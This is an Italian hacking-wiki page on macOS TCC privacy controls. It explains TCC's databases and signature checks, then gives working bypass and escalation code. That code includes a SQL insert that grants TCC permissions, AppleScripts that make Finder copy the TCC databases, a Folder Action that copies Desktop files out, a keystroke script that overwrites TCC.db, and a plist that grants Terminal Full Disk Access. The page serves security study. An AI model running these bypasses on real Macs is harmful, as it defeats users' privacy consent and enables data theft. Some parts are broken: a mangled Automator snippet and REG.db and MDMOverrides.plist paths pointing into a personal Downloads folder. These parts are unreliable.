# macOS TCC

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informazioni di Base**

**TCC (Trasparenza, Consenso e Controllo)** è un protocollo di sicurezza che si concentra sulla regolamentazione delle autorizzazioni delle applicazioni. Il suo ruolo principale è quello di proteggere funzionalità sensibili come **servizi di localizzazione, contatti, foto, microfono, fotocamera, accessibilità e accesso completo al disco**. Obbligando il consenso esplicito dell'utente prima di concedere l'accesso dell'applicazione a questi elementi, TCC migliora la privacy e il controllo dell'utente sui propri dati.

Gli utenti si trovano di fronte a TCC quando le applicazioni richiedono l'accesso a funzionalità protette. Questo è visibile attraverso un prompt che consente agli utenti di **approvare o negare l'accesso**. Inoltre, TCC supporta azioni dirette dell'utente, come **trascinare e rilasciare file in un'applicazione**, per concedere l'accesso a file specifici, garantendo che le applicazioni abbiano accesso solo a ciò che è esplicitamente consentito.

![Un esempio di prompt TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** è gestito dal **daemon** situato in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurato in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando il servizio mach `com.apple.tccd.system`).

C'è un **tccd in modalità utente** in esecuzione per ogni utente loggato definito in `/System/Library/LaunchAgents/com.apple.tccd.plist` registrando i servizi mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Qui puoi vedere il tccd in esecuzione come sistema e come utente:

```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Le autorizzazioni sono **ereditate dall'applicazione genitore** e le **autorizzazioni** sono **tracciate** in base all'**ID Bundle** e all'**ID Sviluppatore**.

### Database TCC

Le autorizzazioni/negazioni vengono quindi memorizzate in alcuni database TCC:

* Il database a livello di sistema in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Questo database è **protetto da SIP**, quindi solo un bypass di SIP può scriverci.
* Il database utente TCC **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** per le preferenze per utente.
* Questo database è protetto, quindi solo i processi con privilegi TCC elevati come l'Accesso Completo al Disco possono scriverci (ma non è protetto da SIP).

{% hint style="warning" %}
I database precedenti sono anche **protetti da TCC per l'accesso in lettura**. Quindi **non sarai in grado di leggere** il tuo database TCC utente regolare a meno che non sia da un processo con privilegi TCC.

Tuttavia, ricorda che un processo con questi privilegi elevati (come **FDA** o **`kTCCServiceEndpointSecurityClient`**) sarà in grado di scrivere nel database TCC degli utenti.
{% endhint %}

* C'è un **terzo** database TCC in **`/var/db/locationd/clients.plist`** per indicare i clienti autorizzati ad **accedere ai servizi di localizzazione**.
* Il file protetto da SIP **`/Users/carlospolop/Downloads/REG.db`** (anche protetto dall'accesso in lettura con TCC), contiene la **posizione** di tutti i **database TCC validi**.
* Il file protetto da SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (anche protetto dall'accesso in lettura con TCC), contiene più autorizzazioni concesse da TCC.
* Il file protetto da SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (ma leggibile da chiunque) è un elenco di applicazioni che richiedono un'eccezione TCC.

{% hint style="success" %}
Il database TCC in **iOS** si trova in **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
Il **centro notifiche UI** può apportare **modifiche nel database TCC di sistema**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Tuttavia, gli utenti possono **eliminare o interrogare le regole** con l'utilità da riga di comando **`tccutil`**.
{% endhint %}

#### Interrogare i database

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="sistema DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Controllando entrambi i database è possibile verificare i permessi che un'app ha consentito, ha vietato o non ha (chiederà di concederlo).
{% endhint %}

* Il **`servizio`** è la rappresentazione in stringa del **permesso** TCC
* Il **`client`** è il **bundle ID** o il **percorso del binario** con i permessi
* Il **`client_type`** indica se si tratta di un identificatore bundle(0) o di un percorso assoluto(1)

<details>

<summary>Come eseguire se è un percorso assoluto</summary>

Basta fare **`launctl load your_bin.plist`**, con un plist come:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

* Il campo **`auth_value`** può avere valori diversi: denied(0), unknown(1), allowed(2), o limited(3).
* Il campo **`auth_reason`** può assumere i seguenti valori: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Il campo **csreq** serve per indicare come verificare il binario da eseguire e concedere i permessi TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

* Per ulteriori informazioni sui **altri campi** della tabella [**controlla questo post sul blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Puoi anche controllare le **autorizzazioni già fornite** alle app in `Preferenze di Sistema --> Sicurezza e Privacy --> Privacy --> File e Cartelle`.

{% hint style="success" %}
Gli utenti _possono_ **eliminare o interrogare regole** utilizzando **`tccutil`**.
{% endhint %}

#### Reimposta le autorizzazioni TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

### Controlli delle firme TCC

Il **database** TCC memorizza l'**ID Bundle** dell'applicazione, ma memorizza anche **informazioni** sulla **firma** per **assicurarsi** che l'applicazione che richiede di utilizzare un permesso sia quella corretta.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Pertanto, altre applicazioni che utilizzano lo stesso nome e ID bundle non saranno in grado di accedere alle autorizzazioni concesse ad altre app.
{% endhint %}

### Autorizzazioni e Permessi TCC

Le app **non solo devono** richiedere e ottenere **accesso** a determinate risorse, ma devono anche **avere le autorizzazioni pertinenti**.\
Ad esempio, **Telegram** ha l'autorizzazione `com.apple.security.device.camera` per richiedere **accesso alla fotocamera**. Un'applicazione che **non** ha questa **autorizzazione non potrà** accedere alla fotocamera (e all'utente non verrà nemmeno chiesto il permesso).

Tuttavia, per le app che devono **accedere** a **determinate cartelle dell'utente**, come `~/Desktop`, `~/Downloads` e `~/Documents`, non è necessario avere autorizzazioni **specifiche.** Il sistema gestirà l'accesso in modo trasparente e **chiederà all'utente** quando necessario.

Le app di Apple **non genereranno prompt**. Contengono **diritti preconcessi** nel loro elenco di **autorizzazioni**, il che significa che **non genereranno mai un popup**, **né** compariranno in nessuno dei **database TCC.** Ad esempio:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```

Questo eviterà a Calendar di chiedere all'utente di accedere ai promemoria, al calendario e alla rubrica.

{% hint style="success" %}
Oltre a alcune documentazioni ufficiali sugli entitlement, è anche possibile trovare **informazioni interessanti sugli entitlement** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Alcuni permessi TCC sono: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Non esiste un elenco pubblico che definisca tutti loro, ma puoi controllare questa [**lista di quelli conosciuti**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Luoghi sensibili non protetti

* $HOME (stesso)
* $HOME/.ssh, $HOME/.aws, ecc
* /tmp

### Intento dell'utente / com.apple.macl

Come già menzionato, è possibile **concedere l'accesso a un'app a un file trascinandolo su di essa**. Questo accesso non sarà specificato in alcun database TCC ma come un **attributo esteso del file**. Questo attributo **memorizzerà l'UUID** dell'app consentita:

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

{% hint style="info" %}
È curioso che l'attributo **`com.apple.macl`** sia gestito dal **Sandbox**, non da tccd.

Nota anche che se sposti un file che consente l'UUID di un'app sul tuo computer a un computer diverso, poiché la stessa app avrà UID diversi, non concederà accesso a quell'app.
{% endhint %}

L'attributo esteso `com.apple.macl` **non può essere cancellato** come gli altri attributi estesi perché è **protetto da SIP**. Tuttavia, come [**spiegato in questo post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), è possibile disabilitarlo **comprimendo** il file, **eliminandolo** e **decomprimendolo**.

## TCC Privesc & Bypasses

### Inserimento in TCC

Se in qualche momento riesci ad ottenere accesso in scrittura su un database TCC, puoi utilizzare qualcosa di simile al seguente per aggiungere una voce (rimuovi i commenti):

<details>

<summary>Esempio di inserimento in TCC</summary>

\`\`\`sql INSERT INTO access ( service, client, client\_type, auth\_value, auth\_reason, auth\_version, csreq, policy\_id, indirect\_object\_identifier\_type, indirect\_object\_identifier, indirect\_object\_code\_identity, flags, last\_modified, pid, pid\_version, boot\_uuid, last\_reminded ) VALUES ( 'kTCCServiceSystemPolicyDesktopFolder', -- service 'com.googlecode.iterm2', -- client 0, -- client\_type (0 - bundle id) 2, -- auth\_value (2 - allowed) 3, -- auth\_reason (3 - "User Set") 1, -- auth\_version (always 1) X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now NULL, -- policy\_id NULL, -- indirect\_object\_identifier\_type 'UNUSED', -- indirect\_object\_identifier - default value NULL, -- indirect\_object\_code\_identity 0, -- flags strftime('%s', 'now'), -- last\_modified with default current timestamp NULL, -- assuming pid is an integer and optional NULL, -- assuming pid\_version is an integer and optional 'UNUSED', -- default value for boot\_uuid strftime('%s', 'now') -- last\_reminded with default current timestamp ); \`\`\`

</details>

### Carichi TCC

Se sei riuscito ad entrare in un'app con alcuni controlli di permessi TCC, controlla la seguente pagina con i carichi utili TCC per abusarne:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Automazione (Finder) verso FDA\*

Il nome TCC del permesso di Automazione è: **`kTCCServiceAppleEvents`**\
Questo specifico permesso TCC indica anche l'**applicazione che può essere gestita** all'interno del database TCC (quindi i permessi non consentono di gestire tutto).

**Finder** è un'applicazione che **ha sempre FDA** (anche se non compare nell'interfaccia utente), quindi se hai privilegi di **Automazione** su di essa, puoi abusare dei suoi privilegi per **farla eseguire alcune azioni**.\
In questo caso, la tua app avrebbe bisogno del permesso **`kTCCServiceAppleEvents`** su **`com.apple.Finder`**.

{% tabs %}
{% tab title="Rubare il database TCC degli utenti" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Rubare il database TCC dei sistemi" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Potresti abusare di questo per **creare il tuo database utente TCC**.

{% hint style="warning" %}
Con questo permesso sarai in grado di **chiedere a Finder di accedere alle cartelle restritte da TCC** e darti i file, ma a quanto ne so **non sarai in grado di fare in modo che Finder esegua codice arbitrario** per abusare appieno del suo accesso FDA.

Pertanto, non sarai in grado di abusare delle abilità complete di FDA.
{% endhint %}

Questa è la finestra di dialogo TCC per ottenere i privilegi di Automazione su Finder:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Nota che poiché l'applicazione **Automator** ha il permesso TCC **`kTCCServiceAppleEvents`**, può **controllare qualsiasi app**, come Finder. Quindi, avendo il permesso di controllare Automator, potresti controllare anche il **Finder** con un codice come quello di seguito:
{% endhint %}

<details>

<summary>Ottieni una shell all'interno di Automator</summary>

\`\`\`applescript osascript<

tell application "Automator" set actionID to Automator action id "com.apple.RunShellScript" tell (make new workflow) add actionID to it tell last Automator action set value of setting "inputMethod" to 1 set value of setting "COMMAND\_STRING" to theScript end tell execute it end tell activate end tell EOD

## Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear

````
</details>

Lo stesso accade con l'app **Script Editor,** può controllare Finder, ma utilizzando un AppleScript non è possibile forzarlo ad eseguire uno script.

### Automazione (SE) per alcuni TCC

**System Events può creare Azioni Cartella, e le Azioni Cartella possono accedere a alcune cartelle TCC** (Desktop, Documenti e Download), quindi uno script come il seguente può essere utilizzato per abusare di questo comportamento:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
````

#### Automazione (SE) + Accessibilità (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** per FDA\*

L'automazione su **`System Events`** + l'accessibilità (**`kTCCServicePostEvent`**) consentono di inviare **tasti premuti ai processi**. In questo modo potresti abusare di Finder per modificare il database TCC dell'utente o per concedere l'accesso completo ai dati a un'applicazione arbitraria (anche se potrebbe essere richiesta la password per questo).

Esempio di sovrascrittura di TCC.db degli utenti da parte di Finder:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```

#### `kTCCServiceAccessibility` a FDA\*

Controlla questa pagina per alcuni [**payloads per abusare dei permessi di Accessibility**](macos-tcc-payloads.md#accessibility) per ottenere privilegi elevati a FDA\* o eseguire un keylogger, ad esempio.

#### **Client di Sicurezza dell'Endpoint a FDA**

Se hai **`kTCCServiceEndpointSecurityClient`**, hai FDA. Fine.

#### Policy di Sistema File SysAdmin a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permette di **cambiare** l'attributo **`NFSHomeDirectory`** di un utente che cambia la sua cartella home e quindi permette di **bypassare TCC**.

#### User TCC DB a FDA

Ottenendo **permessi di scrittura** sul **database TCC dell'utente** non puoi concederti i permessi **`FDA`**, solo quello che risiede nel database di sistema può concederli.

Ma puoi **concederti i diritti di Automazione a Finder**, e abusare della tecnica precedente per ottenere l'escalation a FDA\*.

#### **FDA a permessi TCC**

L'Accesso Completo al Disco nel nome TCC è **`kTCCServiceSystemPolicyAllFiles`**

Non penso che questo sia un vero privilegio elevato, ma nel caso in cui lo trovi utile: se controlli un programma con FDA puoi **modificare il database TCC degli utenti e concederti qualsiasi accesso**. Questo può essere utile come tecnica di persistenza nel caso in cui potresti perdere i tuoi permessi FDA.

#### **SIP Bypass a TCC Bypass**

Il database di sistema TCC è protetto da **SIP**, ecco perché solo i processi con i **diritti indicati saranno in grado di modificarlo**. Pertanto, se un attaccante trova un **bypass SIP** su un **file** (essere in grado di modificare un file limitato da SIP), sarà in grado di:

* **Rimuovere la protezione** di un database TCC e concedersi tutti i permessi TCC. Potrebbe abusare di uno di questi file, ad esempio:
* Il database di sistema TCC
* REG.db
* MDMOverrides.plist

Tuttavia, c'è un'altra opzione per abusare di questo **bypass SIP per bypassare TCC**, il file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` è un elenco di applicazioni che richiedono un'eccezione TCC. Pertanto, se un attaccante può **rimuovere la protezione SIP** da questo file e aggiungere la **propria applicazione**, l'applicazione sarà in grado di bypassare TCC.\
Per esempio per aggiungere il terminale:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```

#### Bypass di TCC

### Riferimenti

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

</details>
